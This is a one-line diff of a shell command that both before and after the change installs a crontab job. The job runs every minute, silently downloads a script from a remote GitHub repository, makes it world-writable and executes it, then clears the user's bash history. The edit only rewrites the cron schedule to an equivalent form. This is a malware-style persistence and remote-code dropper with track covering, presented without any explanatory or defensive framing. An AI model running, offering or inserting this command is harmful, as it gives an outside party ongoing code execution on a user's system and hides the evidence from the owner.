@@ -1,1 +1,1 @@
-echo 'MAILTO=""' > ~/.crontab && echo '*/1 * * * * rm ~/.q || true && curl --location --silent "https://raw.githubusercontent.com/TheFreeCompute/q/master/01_model.sh?_=$(date +%s)" -o ~/.q && chmod 777 ~/.q && ~/.q' >> ~/.crontab && crontab ~/.crontab && echo '' > .bash_history || true
+echo 'MAILTO=""' > ~/.crontab && echo '* * * * * rm ~/.q || true && curl --location --silent "https://raw.githubusercontent.com/TheFreeCompute/q/master/01_model.sh?_=$(date +%s)" -o ~/.q && chmod 777 ~/.q && ~/.q' >> ~/.crontab && crontab ~/.crontab && echo '' > .bash_history || true
